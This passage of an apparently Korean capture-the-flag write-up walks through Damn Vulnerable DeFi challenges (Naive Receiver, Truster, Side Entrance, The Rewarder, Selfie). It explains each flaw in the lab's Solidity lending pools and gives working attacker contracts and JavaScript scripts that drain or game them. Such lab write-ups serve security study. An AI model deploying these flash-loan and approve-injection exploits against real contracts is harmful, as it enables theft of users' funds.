</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flashLoan</span>(<span style="color:#66d9ef">address</span> borrower, <span style="color:#66d9ef">uint256</span> borrowAmount) <span style="color:#66d9ef">external</span> nonReentrant {
    <span style="color:#75715e">// (1) Flash Loan 컨트랙트의 잔액이 borrowAmount에 비해 충분한지 확인
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint256</span> balanceBefore <span style="color:#f92672">=</span> <span style="color:#66d9ef">address</span>(this).balance;
    require(balanceBefore <span style="color:#f92672">&gt;=</span> borrowAmount, <span style="color:#e6db74">&#34;Not enough ETH in pool&#34;</span>);

    <span style="color:#75715e">// (2) 대출자인 borrower가 컨트랙트인지 확인(not EOA)
</span><span style="color:#75715e"></span>    require(borrower.isContract(), <span style="color:#e6db74">&#34;Borrower must be a deployed contract&#34;</span>);

    <span style="color:#75715e">// borrower.receiveEther() 호출
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Transfer ETH and handle control to receiver
</span><span style="color:#75715e"></span>    borrower.functionCallWithValue(
        abi.encodeWithSignature(
            <span style="color:#e6db74">&#34;receiveEther(uint256)&#34;</span>,
            FIXED_FEE
        ),
        borrowAmount
    );
    
    require(
        <span style="color:#66d9ef">address</span>(this).balance <span style="color:#f92672">&gt;=</span> balanceBefore <span style="color:#f92672">+</span> FIXED_FEE,
        <span style="color:#e6db74">&#34;Flash loan hasn&#39;t been paid back&#34;</span>
    );
}
...
</code></pre></div><p>위 코드를 보면 확인할 수 있듯이, <code>flashLoan()</code> 을 호출하여 대출을 실행하는 사용자인 <code>msg.sender</code>가 <code>borrower</code>인지 검증하는 로직이 없어, 공격자가 임의의 사용자 주소를 <code>borrower</code>에 입력하여 호출이 가능하다.</p>
<h3 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h3>
<p><strong>naive-receiver.challenge.js</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">10</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
    <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pool</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">flashLoan</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">receiver</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#39;0&#39;</span>));
}
</code></pre></div><hr>
<h2 id="-3---truster"># 3. - Truster<a hidden class="anchor" aria-hidden="true" href="#-3---truster">#</a></h2>
<h3 id="summary-2">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-2">#</a></h3>
<p>Flash Loan을 기반으로 DTV 토큰을 무료로 대출해주는 Lending Pool이 있으며, 해당 Lending Pool은 100만개의 DTV 토큰을 가지고 있다.
해당 Lending Pool로부터 모든 DTV 토큰을 공격자의 계정으로 옮기는 것이 목표이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity">...
<span style="color:#75715e">// functionCall()을 이용하여 target 컨트랙트의 및 특정 함수를 호출하는 코드로 인해, 공격자는 어떠한 함수든 호출이 가능
</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flashLoan</span>(
        <span style="color:#66d9ef">uint256</span> borrowAmount,
        <span style="color:#66d9ef">address</span> borrower,
        <span style="color:#66d9ef">address</span> target,
        <span style="color:#66d9ef">bytes</span> calldata data
    )
        <span style="color:#66d9ef">external</span>
        nonReentrant
    {
        <span style="color:#66d9ef">uint256</span> balanceBefore <span style="color:#f92672">=</span> damnValuableToken.balanceOf(<span style="color:#66d9ef">address</span>(this));
        require(balanceBefore <span style="color:#f92672">&gt;=</span> borrowAmount, <span style="color:#e6db74">&#34;Not enough tokens in pool&#34;</span>);
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);      <span style="color:#75715e">// Vulnerable : target 및 data를 이용해 함수 호출 -&gt; 어떠한 함수든 호출이 가능한 상황
</span><span style="color:#75715e"></span>
        <span style="color:#66d9ef">uint256</span> balanceAfter <span style="color:#f92672">=</span> damnValuableToken.balanceOf(<span style="color:#66d9ef">address</span>(this));
        require(balanceAfter <span style="color:#f92672">&gt;=</span> balanceBefore, <span style="color:#e6db74">&#34;Flash loan hasn&#39;t been paid back&#34;</span>);
    }
...
</code></pre></div><p><code>target.functionCall(data);</code> 에 의해 현재 어떠한 함수든 사용자가 호출이 가능한 상황이다.</p>
<p><code>require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn't been paid back&quot;);</code> 구문 우회를 위해, <code>approve()</code> 함수를 호출하도록하여 Lending Pool-&gt;공격자로 토큰 전송을 승인해두고 <code>flashLoan()</code> 호출 이후에 <code>transferFrom()</code>을 이용해 Lending Pool의 모든 토큰을 공격자의 계정으로 가져올 수 있다.</p>
<h3 id="exploit-2">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-2">#</a></h3>
<p><strong>truster.challenge.js</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ABI</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;function approve(address, uint256)&#34;</span>];
<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">interface</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">Interface</span>(<span style="color:#a6e22e">ABI</span>);
<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">interface</span>.<span style="color:#a6e22e">encodeFunctionData</span>(<span style="color:#e6db74">&#34;approve&#34;</span>, [<span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">TOKENS_IN_POOL</span>.<span style="color:#a6e22e">toString</span>()]);

<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pool</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">flashLoan</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">payload</span>);          <span style="color:#75715e">// token.approve() : lending pool -&gt; attacker
</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">transferFrom</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pool</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">TOKENS_IN_POOL</span>);
</code></pre></div><hr>
<h2 id="-4-side-entrance"># 4. Side entrance<a hidden class="anchor" aria-hidden="true" href="#-4-side-entrance">#</a></h2>
<h3 id="summary-3">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-3">#</a></h3>
<p>누구나,언제든 ETH를 예치/인출할 수 있는 Lending Pool이 있다.</p>
<p>해당 Lending Pool은 1,000 ETH의 balance를 가지고 있으며, 프로모션으로 예치된 ETH를 자유롭게 대출할 수 있는 Flash Loan 서비스를 제공하고 있다.</p>
<p>공격자는 해당 Lending Pool로부터 모든 ETH를 가져와야 한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SideEntranceLenderPool
</span><span style="color:#75715e"></span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">SideEntranceLenderPool</span> {
    <span style="color:#f92672">using</span> Address <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span>;

    <span style="color:#66d9ef">mapping</span> (<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint256</span>) <span style="color:#66d9ef">private</span> balances;

    <span style="color:#75715e">// ETH deposit(예치) 기능 제공
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Vulnerable : ETH 수신 여부와 상관없이 balance를 증가시킴
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">deposit</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
        balances[msg.sender] <span style="color:#f92672">+=</span> msg.value;
    }

    <span style="color:#75715e">// ETH withdraw(인출) 기능 제공
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>() <span style="color:#66d9ef">external</span> {
        <span style="color:#66d9ef">uint256</span> amountToWithdraw <span style="color:#f92672">=</span> balances[msg.sender];
        balances[msg.sender] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
        <span style="color:#66d9ef">payable</span>(msg.sender).sendValue(amountToWithdraw);
    }

    <span style="color:#75715e">/**
</span><span style="color:#75715e">     * @notice Flash Loan 기능으로 사용자에게 원하는 만큼의 ETH를 대출
</span><span style="color:#75715e">     * @param amount 대출할 ETH의 수량
</span><span style="color:#75715e">     * @dev 대출을 요청한 사용자 컨트랙트의 execute() 함수를 호출 -&gt; execute
</span><span style="color:#75715e">     */</span>
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flashLoan</span>(<span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span> {
        <span style="color:#66d9ef">uint256</span> balanceBefore <span style="color:#f92672">=</span> <span style="color:#66d9ef">address</span>(this).balance;
        require(balanceBefore <span style="color:#f92672">&gt;=</span> amount, <span style="color:#e6db74">&#34;Not enough ETH in balance&#34;</span>);
        
        IFlashLoanEtherReceiver(msg.sender).execute{value<span style="color:#f92672">:</span> amount}();

        require(<span style="color:#66d9ef">address</span>(this).balance <span style="color:#f92672">&gt;=</span> balanceBefore, <span style="color:#e6db74">&#34;Flash loan hasn&#39;t been paid back&#34;</span>);        
    }
}
</code></pre></div><p>대출을 요청한 사용자 컨트랙트의 <code>execute()</code> 함수를 실행하며, <code>msg.value</code>를 통해 대출한 ETH 토큰을 전달한다.</p>
<p>deposit() 함수는 ETH를 사용자에게 수신했는지 여부와 상관없이 balance를 증가시키도록 취약한 형태로 작성되어 있다.</p>
<p>공격자는 내부적으로 <code>deposit()</code>을 호출하여 대출한 ETH를 Lending Pool에 예치하는 <code>execute()</code> 함수 및 컨트랙트를 호출한 뒤, <code>flashLoan()</code> 실행이 종료된 이후에 <code>withdraw()</code>를 통해 ETH를 가져올 수 있다.</p>
<ul>
<li>(1) <code>flashLoan()</code>을 통해 대출한 ETH를 다시 <code>deposit()</code>하여 공격자의 balances를 증가시킨다.
<ul>
<li><code>deposit()</code>이 예치한 사용자의 ETH 전송 여부는 확인하지 않기 때문에, 대출한 토큰으로 balances만 증가시키고 다시 상환</li>
</ul>
</li>
<li>(2) 공격자는 <code>withdraw()</code>를 호출하여 Lending Pool의 ETH를 가져온다.</li>
</ul>
<h3 id="exploit-3">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-3">#</a></h3>
<p><strong>attacker-contracts/FlashLoanEtherReceiver.sol</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;

<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;../side-entrance/SideEntranceLenderPool.sol&#34;</span>;

<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">FlashLoanEtherReceiver</span> {
    SideEntranceLenderPool <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">immutable</span> pool;
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">immutable</span> attacker;

    <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> poolAddress, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> attackerAddress) {
        pool <span style="color:#f92672">=</span> SideEntranceLenderPool(poolAddress);
        attacker <span style="color:#f92672">=</span> attackerAddress;
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">execute</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
        pool.deposit{value<span style="color:#f92672">:</span> msg.value}();
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">executeFlashLoan</span>() <span style="color:#66d9ef">external</span> {
        <span style="color:#75715e">// attack -&gt; increase attacker&#39;s balances
</span><span style="color:#75715e"></span>        pool.flashLoan(<span style="color:#66d9ef">address</span>(pool).balance);
        pool.withdraw();

        <span style="color:#75715e">// send drained ether to attacker
</span><span style="color:#75715e"></span>        attacker.transfer(<span style="color:#66d9ef">address</span>(this).balance);
    }

    <span style="color:#75715e">// Allow deposits of ETH
</span><span style="color:#75715e"></span>    receive () <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
}
</code></pre></div><p><strong>side-entrance.challenge.js</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">FlashLoanEtherReceiver</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">getContractFactory</span>(<span style="color:#e6db74">&#39;FlashLoanEtherReceiver&#39;</span>, <span style="color:#a6e22e">attacker</span>);
<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">receiver</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">FlashLoanEtherReceiver</span>.<span style="color:#a6e22e">deploy</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pool</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>);

<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">receiver</span>.<span style="color:#a6e22e">executeFlashLoan</span>();
</code></pre></div><hr>
<h2 id="-5-the-rewarder"># 5. The rewarder<a hidden class="anchor" aria-hidden="true" href="#-5-the-rewarder">#</a></h2>
<h3 id="summary-4">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-4">#</a></h3>
<p>DTV 토큰을 예치한 사용자에게 5일마다 한번씩 리워드 토큰을 보상해주는 Reward Pool이 있다. (라운드마다 100개의 리워드 토큰을 보상하며, 예치한 비율에 따라 분배)</p>
<p>현재 Alice, Bob, Charile, David 4명이 사용자가 각각 100개의 DTV 토큰을 예치한 상태이며, Reward Round 2에서 각각 25개씩의 Reward를 수령하였다.</p>
<p>공격자는 DTV 토큰을 하나도 가지고 있지 않은 상태에서, Reward Round 3에서 가장 많은 Reward Token을 수령하는 것이 목표이다.</p>
<p>100만개의 DTV 토큰을 보유하고 있는 FlashLoanderPool로부터 대출받은 토큰을 Reward Pool에 예치하여 리워드 토큰을 수령하면 된다.</p>
<h3 id="exploit-4">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-4">#</a></h3>
<p><strong>attacker-contracts/FlashLoanTheRewarder.sol</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;

<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts/utils/Address.sol&#34;</span>;

<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IFlashLoanerPool</span> {
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flashLoan</span>(<span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span>;
}

<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IDamnValuableToken</span> {
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">approve</span>(<span style="color:#66d9ef">address</span> spender, <span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>);
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> recipient, <span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>);
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span>) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
}

<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IRewarderPool</span> {
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">deposit</span>(<span style="color:#66d9ef">uint256</span> amountToDeposit) <span style="color:#66d9ef">external</span>;
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>(<span style="color:#66d9ef">uint256</span> amountToWithdraw) <span style="color:#66d9ef">external</span>;
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">distributeRewards</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
}

<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IRewardToken</span> {
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> recipient, <span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>);
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span>) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
}

<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">FlashLoanTheRewarder</span> {
    <span style="color:#f92672">using</span> Address <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span>;

    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">private</span> lenderPool;
    <span style="color:#75715e">//address payable private liquidityToken;
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">private</span> rewarderPool;
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">private</span> attacker;
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">private</span> rewardToken;

    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">private</span> liquidityToken;

    <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> testUint;

    <span style="color:#66d9ef">constructor</span> (<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _lenderPool, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _liquidityToken, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _rewardToken, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _rewarderPool, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _attacker) {
        lenderPool <span style="color:#f92672">=</span> _lenderPool;
        <span style="color:#75715e">//liquidityToken = _liquidityToken;
</span><span style="color:#75715e"></span>        liquidityToken <span style="color:#f92672">=</span> _liquidityToken;
        rewarderPool <span style="color:#f92672">=</span> _rewarderPool;
        rewardToken <span style="color:#f92672">=</span> _rewardToken;
        attacker <span style="color:#f92672">=</span> _attacker;
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">receiveFlashLoan</span>(<span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span> {
        require(msg.sender <span style="color:#f92672">==</span> lenderPool, <span style="color:#e6db74">&#34;Sender must be pool&#34;</span>);

        <span style="color:#75715e">// Flashloan Borrow : Receive liquidity token(DTV) from LenderPool(flashloan)
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">uint256</span> amountToBeRepaid <span style="color:#f92672">=</span> amount;

        IDamnValuableToken(liquidityToken).approve(rewarderPool, amountToBeRepaid);

        IRewarderPool(rewarderPool).deposit(amountToBeRepaid);
        IRewarderPool(rewarderPool).withdraw(amountToBeRepaid);
        
        <span style="color:#75715e">// Flashloan Repayment : Pay back to LenderPool(flashloan)
</span><span style="color:#75715e"></span>        IDamnValuableToken(liquidityToken).transfer(lenderPool, amountToBeRepaid);
        
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">execFlashLoans</span>(<span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span> {
        IFlashLoanerPool(lenderPool).flashLoan(amount);

        IRewardToken(rewardToken).transfer(
            msg.sender,
            IRewardToken(rewardToken).balanceOf(<span style="color:#66d9ef">address</span>(this))
        );
        
    }

    receive () <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
}
</code></pre></div><p><strong>the-rewarder.challenge.js</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">FlashLoanTheRewarder</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">getContractFactory</span>(<span style="color:#e6db74">&#39;FlashLoanTheRewarder&#39;</span>, <span style="color:#a6e22e">attacker</span>);
<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">attackerContract</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">FlashLoanTheRewarder</span>.<span style="color:#a6e22e">deploy</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">flashLoanPool</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">liquidityToken</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rewardToken</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rewarderPool</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>);

<span style="color:#75715e">// Next Reward Round!
</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;evm_increaseTime&#34;</span>, [<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span>]); <span style="color:#75715e">// 5 days
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">attackerContract</span>.<span style="color:#a6e22e">execFlashLoans</span>(<span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#39;1000000&#39;</span>));


<span style="color:#75715e">//console.log(await this.attackerContract.check());
</span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rewarderPool</span>.<span style="color:#a6e22e">roundNumber</span>());
<span style="color:#75715e">// for (let i = 0; i &lt; users.length; i++) {
</span><span style="color:#75715e">//     console.log(await this.rewardToken.balanceOf(users[i].address));
</span><span style="color:#75715e">// }
</span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rewardToken</span>.<span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>));
</code></pre></div><hr>
<h2 id="-6-selfie"># 6. Selfie<a hidden class="anchor" aria-hidden="true" href="#-6-selfie">#</a></h2>
<h3 id="summary-5">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-5">#</a></h3>
<p>Flash Loan을 제공하며 거버넌스 메커니즘을 기반으로 제어가 가능한 150만개의 DTV 토큰을 보유하고 있는 Lending Pool이 있다.</p>
<p>공격자는 0개의 DTV 토큰을 가지고 있으며, 해당 Lending Pool로부터 모든 토큰을 가져오는 것이 목표이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SelfiePool.sol
</span><span style="color:#75715e"></span>...
<span style="color:#75715e">/**
</span><span style="color:#75715e"> * @notice 컨트랙트(펀드)에 있는 모든 토큰 잔액을 해당 주소로 전송 (governance만 해당 함수 호출 가능)
</span><span style="color:#75715e"> * @param receiver 모든 토큰 잔액을 전송할 대상 주소
</span><span style="color:#75715e"> */</span>
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">drainAllFunds</span>(<span style="color:#66d9ef">address</span> receiver) <span style="color:#66d9ef">external</span> onlyGovernance {
    <span style="color:#66d9ef">uint256</span> amount <span style="color:#f92672">=</span> token.balanceOf(<span style="color:#66d9ef">address</span>(this));
    token.transfer(receiver, amount);
    
    emit FundsDrained(receiver, amount);
}
...
</code></pre></div><p>Flash Loan 컨트랙트에는 거버넌스만이 실행할 수 있으며 지정된 계정으로 모든 토큰을 보내는 <code>drainAllFunds()</code> 함수를 제공하고 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SimpleGovernance.sol
</span><span style="color:#75715e"></span>...
<span style="color:#75715e">/**
</span><span style="color:#75715e"> * @notice 거버넌스 큐에 실행할 작업을 적재
</span><span style="color:#75715e"> * @param receiver 작업을 실행할 컨트랙트의 주소
</span><span style="color:#75715e"> * @param data 작업에 사용할 calldata(함수 이름, 인자 등)
</span><span style="color:#75715e"> * @return 큐에 적재된 작업의 식별자(actionId)
</span><span style="color:#75715e"> */</span>
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">queueAction</span>(<span style="color:#66d9ef">address</span> receiver, <span style="color:#66d9ef">bytes</span> calldata data, <span style="color:#66d9ef">uint256</span> weiAmount) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>) {
    require(_hasEnoughVotes(msg.sender), <span style="color:#e6db74">&#34;Not enough votes to propose an action&#34;</span>);          <span style="color:#75715e">// 큐에 작업을 추가하기 위해서는 전체 토큰 발행량의 절반 이상을 가지고 있어야 함
</span><span style="color:#75715e"></span>    require(receiver <span style="color:#f92672">!=</span> <span style="color:#66d9ef">address</span>(this), <span style="color:#e6db74">&#34;Cannot queue actions that affect Governance&#34;</span>);      <span style="color:#75715e">// governance 컨트랙트 내 함수는 실행하지 못함
</span><span style="color:#75715e"></span>
    <span style="color:#66d9ef">uint256</span> actionId <span style="color:#f92672">=</span> actionCounter;

    GovernanceAction <span style="color:#66d9ef">storage</span> actionToQueue <span style="color:#f92672">=</span> actions[actionId];
    actionToQueue.receiver <span style="color:#f92672">=</span> receiver;
    actionToQueue.weiAmount <span style="color:#f92672">=</span> weiAmount;
    actionToQueue.data <span style="color:#f92672">=</span> data;
    actionToQueue.proposedAt <span style="color:#f92672">=</span> block.timestamp;     <span style="color:#75715e">// 작업이 큐에 적재된 시간(timestamp)
</span><span style="color:#75715e"></span>
    actionCounter<span style="color:#f92672">++</span>;

    emit ActionQueued(actionId, msg.sender);
    <span style="color:#66d9ef">return</span> actionId;
}
...
<span style="color:#75715e">/**
</span><span style="color:#75715e"> * @notice 거버넌스 큐에 적재된 작업 실행
